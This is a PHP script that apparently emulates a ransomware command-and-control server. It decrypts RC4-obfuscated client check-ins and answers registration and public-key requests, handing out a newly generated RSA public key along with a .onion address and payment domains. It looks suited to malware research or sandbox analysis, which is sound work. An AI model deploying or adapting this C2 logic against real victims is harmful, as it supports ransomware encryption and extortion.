<?php

/*
 * RC4 symmetric cipher encryption/decryption
 *
 * @license Public Domain
 * @param string key - secret key for encryption/decryption
 * @param string str - string to be encrypted/decrypted
 * @return string
 */
function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}

function main() {
	$idx = array_keys($_GET)[0];
	$param = $_GET[$idx];
	$chars = str_split($param);

	$padding_len = 0;
	foreach($chars as $_ => $ch) {
        	$padding_len += (int)$ch;
	}

	sort($chars);
	$key = implode('', $chars);

	foreach ($_POST as $name => $value) {
		$unpadded_hex_value = substr($value, $padding_len);
		$unpadded_value = hex2bin($unpadded_hex_value);
		$plaintext = rc4($key, $unpadded_value);

		// make sure only valid requests get through
		if($plaintext[0] === '{' && substr($plaintext, -1) === '}') {
			$cmd_id = $plaintext[1];

			// client registration
			// e.g. {1|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|5|1|2|}
			if($cmd_id === '1') {
				// e.g. {155|1}
				$response = '{155|1}';

			// request for public key
			// e.g. {7|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|1}
			} else if ($cmd_id === '7' && substr_count($plaintext, '|') === 3) {
				/** e.g.
				{1tdtzc4|3wzn5p2yiumh7akj.onion|us|waytopaytosystem.com~malkintop100.com~belladonnamonna.com~hiltonpaytoo.com|-----BEGIN PUBLIC KEY-----
				MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/VdY0UONl2uSs/JEkmC
				fU9WaJVgwWJAqIznYUaHkr+oE3jBvhwzRzT8+CxgUWQY1P1NLuMEKopaRHLA0XI/
				DYla8gqV2UZ8zxI4t90ZQeaMtKlEndWUc7w/rYJwoLjeGhM1U5ObpSwZzcs4j0ZV
				k16BNYJokAN7nVCP882M4G3jCJfCdcOaM8IJkk0FuQU5aJYLWwk1M88+bBKqqNb8
				w6GZekM0P1xiNq1sltU2vrZyG43xj6d6TK84dsmYBLRuSi9LJrdF3P6ASxFEkskM
				GZ5di0/MyLw0V30U7QzHAtp7Ri8BdQ4nM3c6tSudYHPuwGJDtWMut0tiimxR+O2f
				cQIDAQAB
				-----END PUBLIC KEY-----|}
				**/

				// generate a new priv-pub keypair
				$priv_key = openssl_pkey_new(array('private_key_bits' => 2048));
				$pub_key = openssl_pkey_get_details($priv_key);
				$export_pub_key = $pub_key['key'];

				$response =
					'{1tdtzc4|3wzn5p2yiumh7akj.onion|us|waytopaytosystem.com~malkintop100.com~belladonnamonna.com~hiltonpaytoo.com|'
					.$export_pub_key
					.'|}';

			// unknown
			// e.g. {3|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43}
			} else if ($cmd_id === '3') {
				// e.g. {234}
				$response = '{234}';

			// post-encryption check-in
			// e.g. {7|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|2|1}
			} else if ($cmd_id === '7' && substr_count($plaintext, '|') === 4) {
				// e.g. {1}
				$response = '{1}';

			// unknown
			} else {
				$response = '{1}';
			}

			echo bin2hex(rc4($key, $response));
		}
	}
}

main();

?>

